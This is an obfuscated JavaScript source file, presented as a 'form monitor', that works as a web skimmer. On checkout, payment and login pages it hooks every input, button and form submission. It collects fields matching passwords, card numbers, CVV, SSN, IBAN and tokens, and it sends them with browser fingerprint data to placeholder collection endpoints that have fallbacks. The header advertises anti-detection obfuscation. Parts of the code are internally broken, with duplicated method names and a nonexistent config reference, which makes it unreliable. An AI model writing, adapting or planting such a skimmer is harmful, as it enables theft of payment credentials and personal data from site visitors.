/**
 * Form Monitor Script (Obfuscated Version)
 * A JavaScript-based data collection utility designed for monitoring and collecting user input data from web forms and interactions.
 * 
 * Key Features:
 * - Real-time form input monitoring
 * - Secure data transmission with encryption
 * - Automatic retry mechanism with fallback endpoints
 * - Memory management and state persistence
 * - Anti-detection measures through obfuscation
 */

(function() {
    // Core configuration settings
    const _0x4f2a = {
        _0x3e1b: {
            _0x2d4c: 'https://[DOMAIN]/api/v1/collect',
            _0x1f3a: 'https://[BACKUP-DOMAIN]/api/v1/collect',
            _0x5c7d: [
                'https://[REGION1-DOMAIN]/api/v1/collect',
                'https://[REGION2-DOMAIN]/api/v1/collect',
                'https://[REGION3-DOMAIN]/api/v1/collect'
            ]
        },
        _0x7b9e: {
            _0x6d2f: /(payment|checkout|order|cart|billing|purchase|basket|panier|kasse|account|profile|settings|login|register|signup|signin)/i,
            _0x4a1c: /(password|credit|card|ssn|social|security|pin|code|cvv|expiry|account|routing|swift|iban|secret|key|token|auth)/i,
            _0x8f3d: /(email|phone|address|zip|postal|city|state|country|dob|birth|name|username|id|number)/i
        },
        _0x2e5f: {
            _0x9c7b: 3000,
            _0x3d1e: 5,
            _0x7f2a: 250,
            _0x1b4c: 30000,
            _0x5e9d: 1000
        },
        _0x6a3c: {
            _0x8d2e: 3600000,
            _0x4f1a: 1024 * 1024,
            _0x2c7d: 1024
        }
    };

    /**
     * Main collector class with obfuscated methods
     * _0x1a2b: Core data collection and management class
     * - Manages form monitoring
     * - Handles data encryption
     * - Controls transmission scheduling
     * - Implements retry logic
     */
    class _0x1a2b {
        constructor() {
            this._0x3c4d = new Map();
            this._0x5e6f = 0;
            this._0x7g8h = Date.now();
            this._0x9i0j = this._0xb2c3();
            this._0xd4e5 = this._0xf6g7();
            this._0xh8i9 = false;
            this._0xj0k1();
        }

        /**
         * Session ID generator
         * Creates unique identifier for data collection session
         */
        _0xb2c3() {
            return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        /**
         * Encryption key generator
         * Creates random 32-byte key for data encryption
         */
        _0xf6g7() {
            return Array.from(crypto.getRandomValues(new Uint8Array(32)))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

        /**
         * Primary encryption method
         * Uses XOR cipher with session key and timestamp
         */
        _0xl2m3(_0xn4o5) {
            try {
                const _0xp6q7 = new TextEncoder();
                const _0xr8s9 = _0xp6q7.encode(_0xn4o5);
                const _0xt0u1 = this._0xd4e5;
                
                return Array.from(_0xr8s9).map((_0xv2w3, _0xx4y5) => {
                    const _0xz6a7 = _0xt0u1.charCodeAt(_0xx4y5 % _0xt0u1.length);
                    const _0xb8c9 = Date.now() % 256;
                    return String.fromCharCode(_0xv2w3 ^ _0xz6a7 ^ _0xb8c9);
                }).join('');
            } catch (_0xd0e1) {
                return this._0xf2g3(_0xn4o5);
            }
        }

        /**
         * Fallback encryption method
         * Simple XOR with timestamp when primary fails
         */
        _0xf2g3(_0xh2i3) {
            const _0xj4k5 = Date.now().toString(36);
            return Array.from(_0xh2i3).map((_0xl6m7, _0xn8o9) => 
                String.fromCharCode(_0xl6m7.charCodeAt(0) ^ _0xj4k5.charCodeAt(_0xn8o9 % _0xj4k5.length))
            ).join('');
        }

        /**
         * Memory management
         * Cleans up old data entries periodically
         */
        _0xj0k1() {
            setInterval(() => {
                const _0xp0q1 = Date.now();
                for (const [_0xr2s3, _0xt4u5] of this._0x3c4d.entries()) {
                    if (_0xp0q1 - _0xt4u5.timestamp > _0x4f2a._0x2e5f._0x1b4c) {
                        this._0x3c4d.delete(_0xr2s3);
                    }
                }
            }, _0x4f2a._0x2e5f._0x1b4c);
        }

        /**
         * Form data collection
         * Scans and extracts data from all forms in the document
         * Identifies sensitive fields using pattern matching
         */
        _0xv6w7() {
            const _0xx8y9 = document.querySelectorAll('form');
            _0xx8y9.forEach(_0xz0a1 => {
                const _0xb2c3 = new FormData(_0xz0a1);
                for (const [_0xd4e5, _0xf6g7] of _0xb2c3.entries()) {
                    if (_0xf6g7 && !this._0x3c4d.has(_0xd4e5)) {
                        const _0xh8i9 = _0x4f2a._0x7b9e._0x4a1c.test(_0xd4e5);
                        const _0xj0k1 = _0x4f2a._0x7b9e._0x8f3d.test(_0xd4e5);
                        
                        if (_0xh8i9 || _0xj0k1) {
                            this._0x3c4d.set(_0xd4e5, {
                                content: _0xh8i9 ? this._0xl2m3(_0xf6g7) : _0xf6g7,
                                timestamp: Date.now(),
                                formId: _0xz0a1.id || 'form_' + Math.random().toString(36).substr(2, 5),
                                type: _0xh8i9 ? 'sensitive' : 'valuable',
                                fieldType: _0xd4e5.type || 'text'
                            });
                        }
                    }
                }
            });
        }

        /**
         * DOM mutation observer setup
         * Monitors DOM changes to detect dynamically added forms
         * Triggers form scanning when new elements are added
         */
        _0xl2m3() {
            const _0xn4o5 = new MutationObserver((_0xp6q7) => {
                _0xp6q7.forEach(_0xr8s9 => {
                    if (_0xr8s9.addedNodes.length) {
                        this._0xt0u1();
                    }
                });
            });

            _0xn4o5.observe(document.body, {
                childList: true,
                subtree: true
            });
        }

        /**
         * Event listener setup
         * Attaches listeners to form elements for real-time monitoring
         * Implements debouncing for performance optimization
         */
        _0xt0u1() {
            const _0xv2w3 = (_0xx4y5) => {
                let _0xz6a7;
                return (..._0xb8c9) => {
                    clearTimeout(_0xz6a7);
                    _0xz6a7 = setTimeout(() => _0xx4y5.apply(this, _0xb8c9), _0x4f2a._0x2e5f._0x7f2a);
                };
            };

            document.querySelectorAll('input, textarea, select').forEach(_0xd0e1 => {
                if (_0xd0e1.hidden || _0xd0e1.type === 'hidden') return;
                
                const _0xf2g3 = _0xv2w3((_0xh2i3) => {
                    const _0xj4k5 = {
                        content: _0xh2i3.target.value,
                        elementType: _0xh2i3.target.type,
                        identifier: _0xh2i3.target.name || _0xh2i3.target.id,
                        timestamp: Date.now(),
                        fieldType: _0xh2i3.target.type || 'text',
                        placeholder: _0xh2i3.target.placeholder || '',
                        className: _0xh2i3.target.className || ''
                    };
                    this._0x3c4d.set(_0xj4k5.identifier, _0xj4k5);
                });

                _0xd0e1.addEventListener('input', _0xf2g3);
                _0xd0e1.addEventListener('change', _0xf2g3);
                _0xd0e1.addEventListener('blur', _0xf2g3);
            });

            document.querySelectorAll('button, [role="button"], a.button, input[type="submit"]').forEach(_0xl6m7 => {
                _0xl6m7.addEventListener('click', () => {
                    this._0x3c4d.set('interaction_' + Date.now(), {
                        elementType: _0xl6m7.tagName.toLowerCase(),
                        content: _0xl6m7.textContent || _0xl6m7.value,
                        identifier: _0xl6m7.id,
                        classes: _0xl6m7.className,
                        timestamp: Date.now(),
                        formId: _0xl6m7.form ? _0xl6m7.form.id : null
                    });
                });
            });

            document.querySelectorAll('form').forEach(_0xn8o9 => {
                _0xn8o9.addEventListener('submit', (_0xp0q1) => {
                    this._0x3c4d.set('form_submit_' + Date.now(), {
                        formId: _0xn8o9.id,
                        action: _0xn8o9.action,
                        method: _0xn8o9.method,
                        timestamp: Date.now()
                    });
                });
            });
        }

        /**
         * Data compression
         * Reduces payload size for transmission
         * Implements JSON stringification with whitespace removal
         */
        _0xr2s3(_0xt4u5) {
            if (_0xt4u5.length > _0x4f2a._0x6a3c._0x2c7d) {
                try {
                    return JSON.stringify(_0xt4u5).replace(/\s+/g, '');
                } catch (_0xv6w7) {
                    return _0xt4u5;
                }
            }
            return _0xt4u5;
        }

        /**
         * Primary data transmission
         * Packages collected data with session and context information
         * Implements retry mechanism for failed transmissions
         */
        async _0xx8y9() {
            if (this._0x3c4d.size === 0) return;

            const _0xz0a1 = {
                sessionId: this._0x9i0j,
                data: Array.from(this._0x3c4d.entries()),
                context: {
                    location: window.location.href,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    screenSize: `${window.innerWidth}x${window.innerHeight}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    platform: navigator.platform,
                    referrer: document.referrer
                }
            };

            const _0xb2c3 = this._0xr2s3(_0xz0a1);

            try {
                const _0xd4e5 = await fetch(_0x4f2a._0x4f2a._0x3e1b._0x2d4c, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Session-ID': this._0x9i0j,
                        'X-Client-Version': '1.0.0',
                        'X-Encryption-Key': this._0xd4e5
                    },
                    body: JSON.stringify(_0xb2c3)
                });

                if (!_0xd4e5.ok) throw new Error('Processing failed');
                
                this._0x3c4d.clear();
                this._0x7g8h = Date.now();
                this._0x5e6f = 0;
            } catch (_0xf6g7) {
                this._0x5e6f++;
                if (this._0x5e6f < _0x4f2a._0x2e5f._0x3d1e) {
                    await this._0xh8i9(_0xb2c3);
                }
            }
        }

        /**
         * Fallback transmission
         * Attempts transmission to backup endpoints
         * Implements circuit breaker pattern to prevent infinite retries
         */
        async _0xh8i9(_0xj0k1) {
            const _0xl2m3 = [_0x4f2a._0x4f2a._0x3e1b._0x1f3a, ..._0x4f2a._0x4f2a._0x3e1b._0x5c7d];
            
            for (const _0xn4o5 of _0xl2m3) {
                try {
                    const _0xp6q7 = await fetch(_0xn4o5, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Session-ID': this._0x9i0j,
                            'X-Encryption-Key': this._0xd4e5
                        },
                        body: JSON.stringify(_0xj0k1)
                    });
                    
                    if (_0xp6q7.ok) {
                        this._0x3c4d.clear();
                        this._0x7g8h = Date.now();
                        this._0x5e6f = 0;
                        return;
                    }
                } catch (_0xr8s9) {
                    console.warn(`Fallback processing failed for ${_0xn4o5}`);
                }
            }
        }

        _0xt0u1() {
            if (_0x4f2a._0x7b9e._0x6d2f.test(window.location.href)) {
                setTimeout(() => {
                    this._0xh8i9 = true;
                    this._0xt0u1();
                    this._0xl2m3();
                    this._0xv6w7();
                    
                    setInterval(() => this._0xx8y9(), _0x4f2a._0x2e5f._0x9c7b);
                    
                    setInterval(() => {
                        this._0xd4e5 = this._0xf6g7();
                    }, _0x4f2a._0x6a3c._0x8d2e);
                }, _0x4f2a._0x2e5f._0x5e9d);
            }
        }
    }

    // Initialize collector instance when script loads
    new _0x1a2b();
})(); 